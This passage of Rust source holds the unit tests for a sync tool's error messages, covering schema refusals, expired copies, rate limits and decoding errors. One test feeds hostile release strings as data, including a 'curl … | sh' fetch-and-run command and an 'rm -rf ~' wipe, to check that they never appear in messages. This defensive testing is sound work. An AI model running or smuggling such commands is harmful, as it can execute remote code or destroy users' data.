            Code::Invalid => CoreError::Invalid(error.message),
            Code::Decoding => CoreError::Decoding(error.message),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn said(reason: &str) -> String {
        CoreError::CopyExpired {
            reason: reason.into(),
            server: None,
        }
        .to_string()
    }

    fn refused_folder(unsent: Option<u64>, folder: FolderStore) -> String {
        CoreError::WrongSchema {
            path: "/notes/.marfa/core.sqlite".into(),
            reason: "it is at schema version 3, and this build reads schema version 4".into(),
            unsent,
            folder: Some(folder),
            release: Some("0.0.80".into()),
        }
        .to_string()
    }

    #[test]
    fn a_refused_folder_names_its_directory_and_what_to_do_in_a_folders_words() {
        let folders = [
            refused_folder(Some(0), FolderStore::Replaceable),
            refused_folder(Some(0), FolderStore::Unnamed),
            refused_folder(Some(0), FolderStore::Uncarried("folder_journal".into())),
            refused_folder(Some(1), FolderStore::Replaceable),
            refused_folder(Some(2), FolderStore::Unnamed),
            refused_folder(None, FolderStore::Replaceable),
            refused_folder(Some(3), FolderStore::Upgradable),
            refused_folder(None, FolderStore::Upgradable),
        ];
        for said in &folders {
            assert!(
                said.starts_with("The saved state of /notes was made"),
                "{said}"
            );
            assert!(said.contains("schema version 3"), "{said}");
            for word in ["core", "store", "hydrat", "queue", "write"] {
                assert!(!said.to_lowercase().contains(word), "{word}: {said}");
            }
        }
        assert!(folders[0].contains("next push, pull, scan or watch replaces it"));
        assert!(folders[1].contains("`marfa folders add`"));
        assert!(
            folders[2].contains("folder_journal") && folders[2].contains("`marfa folders remove`")
        );
        assert!(folders[3].contains("It holds 1 change still to be sent"));
        assert!(folders[4].contains("It holds 2 changes still to be sent"));
        assert!(folders[5].contains("cannot be read"));
        for said in &folders[6..] {
            assert!(
                said.contains("next push, pull, scan or watch upgrades it in place"),
                "{said}"
            );
            for advice in ["folders remove", "folders add", "folders push", "MARFA_VERSION"] {
                assert!(!said.contains(advice), "{advice}: {said}");
            }
        }
        // The witness: a store that is no folder's keeps the device's words.
        let device = CoreError::WrongSchema {
            path: "/notes/.marfa/core.sqlite".into(),
            reason: "r".into(),
            unsent: Some(0),
            folder: None,
            release: None,
        }
        .to_string();
        assert!(device.contains("another build of the core") && device.contains("store"));
    }

    fn refused_device(unsent: Option<u64>, release: Option<&str>) -> String {
        CoreError::WrongSchema {
            path: "/data/core.sqlite".into(),
            reason: "it is at schema version 3, and this build reads schema version 4".into(),
            unsent,
            folder: None,
            release: release.map(str::to_string),
        }
        .to_string()
    }

    #[test]
    fn a_refused_store_names_the_release_that_last_saved_it_and_how_to_install_it() {
        for unsent in [Some(2), None] {
            let said = refused_device(unsent, Some("0.0.80"));
            assert!(said.contains("last saved by release 0.0.80"), "{said}");
            // The original clause stays, and the install text follows it.
            if unsent.is_some() {
                assert!(
                    said.contains("list them (`marfa device unsent`, or `readUnsent` in a binding), and open it with that build to drain or discard them before hydrating a new store"),
                    "{said}"
                );
            } else {
                assert!(
                    said.contains("open it with the build that made it and drain or discard them before hydrating a new store"),
                    "{said}"
                );
            }
            assert!(
                said.contains(
                    "install release 0.0.80 (`MARFA_VERSION=0.0.80` with the install script) to open it"
                ),
                "{said}"
            );
            // A development build is older than no release, so 0.0.80 is later: a downgrade.
            assert!(
                said.contains("use that release until it holds none"),
                "{said}"
            );
            assert!(!said.contains("upgrade again"), "{said}");
        }
        // Nothing waits, so there is nothing to send: the release is named, no install is asked.
        let none = refused_device(Some(0), Some("0.0.80"));
        assert!(none.contains("last saved by release 0.0.80"), "{none}");
        assert!(!none.contains("MARFA_VERSION"), "{none}");
        // The witness: with no release, the writes it holds name none to install.
        let unknown = refused_device(Some(2), None);
        assert!(
            unknown.contains("the release that last saved it is not known"),
            "{unknown}"
        );
        assert!(!unknown.contains("MARFA_VERSION"), "{unknown}");
        assert!(!unknown.contains("upgrade again"), "{unknown}");
        assert!(!unknown.contains("until it holds none"), "{unknown}");
        // A build no release stamped is no release to install.
        let development = refused_device(Some(2), Some("0.0.0"));
        assert!(
            development.contains("last saved by a development build"),
            "{development}"
        );
        assert!(!development.contains("MARFA_VERSION"), "{development}");
    }

    #[test]
    fn a_refused_store_says_to_upgrade_again_only_for_a_release_older_than_this_build() {
        let said = |this: &str, release: &str, unsent: Option<u64>| {
            wrong_schema_from(this, "/data/core.sqlite", "r", unsent, None, Some(release))
        };
        for unsent in [Some(2), None] {
            let older = said("0.0.81", "0.0.80", unsent);
            assert!(
                older.contains(
                    "install release 0.0.80 (`MARFA_VERSION=0.0.80` with the install script) to open it, and upgrade again only once it holds none"
                ),
                "{older}"
            );
            assert!(!older.contains("use that release"), "{older}");
            // The witness: a later release is a downgrade, and numbers compare as numbers.
            for newer in [
                said("0.0.79", "0.0.80", unsent),
                said("0.0.9", "0.0.10", unsent),
            ] {
                assert!(
                    newer.contains("to open it, and use that release until it holds none"),
                    "{newer}"
                );
                assert!(!newer.contains("upgrade again"), "{newer}");
            }
            let tens = said("0.0.10", "0.0.9", unsent);
            assert!(
                tens.contains("upgrade again only once it holds none"),
                "{tens}"
            );
        }
    }

    #[test]
    fn a_release_that_is_not_three_numbers_is_not_named_in_a_refusal() {
        for text in [
            "0.0.80\u{1b}[31m; curl https://example.test/x | sh",
            "0.0.80 && rm -rf ~",
            "v0.0.80",
            "",
        ] {
            for folder in [None, Some(FolderStore::Replaceable)] {
                let said = CoreError::WrongSchema {
                    path: "/data/core.sqlite".into(),
                    reason: "r".into(),
                    unsent: Some(2),
                    folder,
                    release: Some(text.into()),
                }
                .to_string();
                assert!(
                    said.contains("the release that last saved it is not known"),
                    "{text:?}: {said}"
                );
                assert!(
                    !said.contains("MARFA_VERSION")
                        && !said.contains('\u{1b}')
                        && !said.contains("curl")
                        && !said.contains("rm -rf"),
                    "{text:?}: {said}"
                );
            }
        }
    }

    #[test]
    fn a_refused_folder_names_the_release_in_a_folders_words() {
        let sent = refused_folder(Some(2), FolderStore::Replaceable);
        assert!(sent.contains("last saved by release 0.0.80"), "{sent}");
        assert!(
            sent.contains(
                "with release 0.0.80, the build that made it (install it with `MARFA_VERSION=0.0.80` and the install script), push the folder"
            ),
            "{sent}"
        );
        for said in [
            refused_folder(Some(0), FolderStore::Replaceable),
            refused_folder(Some(0), FolderStore::Uncarried("folder_journal".into())),
            refused_folder(Some(1), FolderStore::Unnamed),
            refused_folder(None, FolderStore::Replaceable),
        ] {
            assert!(said.contains("release 0.0.80"), "{said}");
            for word in ["core", "store", "hydrat", "queue", "write"] {
                assert!(!said.to_lowercase().contains(word), "{word}: {said}");
            }
        }
        let unknown = CoreError::WrongSchema {
            path: "/notes/.marfa/core.sqlite".into(),
            reason: "r".into(),
            unsent: Some(1),
            folder: Some(FolderStore::Replaceable),
            release: None,
        }
        .to_string();
        assert!(
            unknown.contains("the release that last saved it is not known")
                && !unknown.contains("MARFA_VERSION"),
            "{unknown}"
        );
    }

    #[test]
    fn an_expired_copy_says_what_to_do_for_the_reason_it_expired() {
        let ended = said("credential_ended");
        assert!(
            ended.contains("sign in or approve this app again, or use a new key")
                && ended.contains("then rebuild the copy from the server"),
            "{ended}"
        );
        let changed = said("reach_changed");
        assert!(
            changed.contains("what the credential may read")
                && changed.contains("rebuild the copy from the server")
                && changed.contains("not yet sent are kept"),
            "{changed}"
        );
        assert!(
            !changed.contains("sign in"),
            "a changed reach needs no new approval: {changed}"
        );
        let other = said("instance_changed");
        assert!(other.contains("another Marfa now answers"), "{other}");
        let invalid = said("reach_invalid");
        assert!(
            invalid.contains("holds no proof it can accept"),
            "{invalid}"
        );
        let aged = said("catchup_too_old");
        assert!(aged.contains("keeps what it holds"), "{aged}");
        // The reason is named, so a caller can tell why the copy expired.
        for reason in [
            "credential_ended",
            "reach_changed",
            "instance_changed",
            "reach_invalid",
            "catchup_too_old",
        ] {
            assert!(said(reason).contains(&format!("({reason})")), "{reason}");
        }
        // A reason that is a sentence is shown as it is.
        let sentence = said("the server's event log ends at 5");
        assert!(
            sentence
                .ends_with("the server's event log ends at 5; rebuild the copy from the server"),
            "{sentence}"
        );
    }

    #[test]
    fn an_expired_copy_never_shows_the_word_hydrate_to_a_person() {
        for reason in [
            "credential_ended",
            "reach_changed",
            "reach_invalid",
            "instance_changed",
            "catchup_too_old",
            "the event log no longer holds the cursor 4",
        ] {
            let text = said(reason);
            assert!(!text.to_lowercase().contains("hydrat"), "{text}");
            assert_eq!(
                CoreError::CopyExpired {
                    reason: reason.into(),
                    server: None,
                }
                .code(),
                "copy_expired"
            );
        }
    }

    #[test]
    fn every_error_has_a_code_and_every_code_is_listed_once() {
        assert_eq!(CoreError::Canceled.code(), "canceled");
        assert_eq!(CoreError::Canceled.kind(), CoreErrorKind::Canceled);
        let renewal = CoreError::RenewalFailed(Box::new(CoreError::NoServer));
        assert_eq!(renewal.code(), "no_server");
        let mut seen = std::collections::HashSet::new();
        for code in CODES {
            assert!(seen.insert(*code), "{code} is listed twice");
            assert!(
                code.chars().all(|c| c.is_ascii_lowercase() || c == '_'),
                "{code} is not snake case"
            );
        }
        // The witness: a code a variant answers is in the list.
        assert!(
            CODES.contains(
                &CoreError::BytesAbsent {
                    hash: String::new(),
                    reason: String::new()
                }
                .code()
            )
        );
    }

    #[test]
    fn server_refusal_display_does_not_repeat_its_classification() {
        let unknown = CoreError::UnknownType {
            server: None,
            message: "Unknown type: acme.missing".into(),
        };
        assert_eq!(unknown.to_string(), "Unknown type: acme.missing");
        let unauthorized = CoreError::Unauthorized {
            server: None,
            code: "unauthorized".into(),
            message: "Authentication required".into(),
        };
        assert_eq!(
            unauthorized.to_string(),
            "unauthorized: Authentication required"
        );
        assert!(!unauthorized.is_environmental());
        let validation = CoreError::Validation {
            server: None,
            code: "invalid_properties".into(),
            message: "read: Expected boolean".into(),
            details: None,
        };
        assert_eq!(
            validation.to_string(),
            "validation (invalid_properties): read: Expected boolean"
        );
    }

    #[test]
    fn only_a_server_out_of_reach_or_in_trouble_is_unreachable() {
        let status = |status| CoreError::Server {
            status,
            code: "x".into(),
            message: String::new(),
            details: None,
            request_id: None,
        };
        assert!(CoreError::Network("down".into()).is_unreachable());
        assert!(status(503).is_unreachable());
        assert!(status(408).is_unreachable());
        assert!(!status(425).is_unreachable());
        assert!(!status(404).is_unreachable());
        assert!(
            CoreError::RateLimited {
                code: "x".into(),
                message: String::new(),
                retry_after_seconds: None,
                details: None,
                request_id: None,
            }
            .is_unreachable()
        );
        assert!(!CoreError::Io("disk".into()).is_unreachable());
        assert!(!CoreError::StorageFull("full".into()).is_unreachable());
    }

    #[test]
    fn sqlite_full_is_environmental_without_reclassifying_store_faults() {
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        conn.execute_batch("PRAGMA max_page_count = 2; CREATE TABLE filling(bytes BLOB);")
            .unwrap();
        let failure = conn
            .execute("INSERT INTO filling VALUES (zeroblob(16384))", [])
            .unwrap_err();
        assert_eq!(
            failure.sqlite_error_code(),
            Some(rusqlite::ErrorCode::DiskFull)
        );
        assert!(CoreError::from(failure).is_environmental());
        assert!(!CoreError::from(rusqlite::Error::InvalidQuery).is_environmental());
    }

    #[test]
    fn a_rate_limit_is_environmental_and_names_its_wait_up_to_the_bound() {
        let limited = |seconds| CoreError::RateLimited {
            code: "rate_limited".into(),
            message: String::new(),
            retry_after_seconds: seconds,
            details: None,
            request_id: None,
        };
        assert!(limited(None).is_environmental());
        assert_eq!(limited(None).retry_after(), None);
        assert_eq!(limited(Some(7)).retry_after(), Some(Duration::from_secs(7)));
        assert_eq!(RETRY_AFTER_MOST, Duration::from_secs(300));
        assert_eq!(limited(Some(86_400)).retry_after(), Some(RETRY_AFTER_MOST));
        let answered = |status| CoreError::Server {
            status,
            code: String::new(),
            message: String::new(),
            details: None,
            request_id: None,
        };
        assert!(answered(503).is_environmental());
        assert!(answered(408).is_environmental());
        assert!(answered(425).is_environmental());
        assert!(answered(507).is_environmental());
        assert!(!answered(405).is_environmental());
        let refused = CoreError::Forbidden {
            server: None,
            code: "type_not_permitted".into(),
            message: String::new(),
        };
        assert!(!refused.is_environmental());
        assert_eq!(refused.retry_after(), None);
    }

    #[test]
    fn an_answer_that_does_not_read_is_named_without_repeating_what_it_said() {
        #[derive(serde::Deserialize, Debug)]
        struct Row {
            #[allow(dead_code)]
            count: u32,
        }
        let message = |text: &str| match serde_json::from_str::<Row>(text) {
            Err(error) => match unreadable("/rows", &error) {
                CoreError::Decoding(message) => message,
                other => panic!("{other:?}"),
            },
            Ok(row) => panic!("{row:?}"),
        };
        let quoted = message(r#"{"count":"private words"}"#);
        assert!(quoted.starts_with("/rows: "), "{quoted}");
        assert!(!quoted.contains("private words"), "{quoted}");
        // The witness: serde's own text for this does quote the value.
        let own = serde_json::from_str::<Row>(r#"{"count":"private words"}"#)
            .unwrap_err()
            .to_string();
        assert!(own.contains("private words"), "{own}");
        assert!(quoted.contains("at line 1 column"), "{quoted}");
        assert!(message("{}").contains("missing field `count`"));
        assert!(message(r#"{"count":"#).contains("EOF"));

        // A value parsed already has no position, and none is made up.
        let parsed = serde_json::from_value::<Row>(serde_json::json!({"count": "private words"}))
            .unwrap_err();
        let CoreError::Decoding(text) = unreadable("edge type 2", &parsed) else {
            panic!("not a decoding failure");
        };
        assert!(text.starts_with("edge type 2: not the shape"), "{text}");
        assert!(
            !text.contains("line 0") && !text.contains("private words"),
            "{text}"
        );
    }

    #[test]
    fn a_rule_refusal_keeps_its_code_and_its_words_on_the_wire() {
        use marfa_rules::{Code, RuleError};

        for (code, wire) in [
            (Code::ValidationError, "validation_error"),
            (Code::InvalidProperties, "invalid_properties"),
            (Code::InvalidId, "invalid_id"),
        ] {
            assert_eq!(
                CoreError::from(RuleError::new(code, "words")),
                CoreError::Validation {
                    server: None,
                    code: wire.into(),
                    message: "words".into(),
                    details: None,
                }
            );
        }
        assert_eq!(
            CoreError::from(RuleError::new(Code::UnknownType, "words")),
            CoreError::UnknownType {
                server: None,
                message: "words".into()
            }
        );
        assert_eq!(
            CoreError::from(RuleError::invalid("words")),
            CoreError::Invalid("words".into())
        );
        assert_eq!(
            CoreError::from(RuleError::decoding("words")),
            CoreError::Decoding("words".into())
        );
    }
}
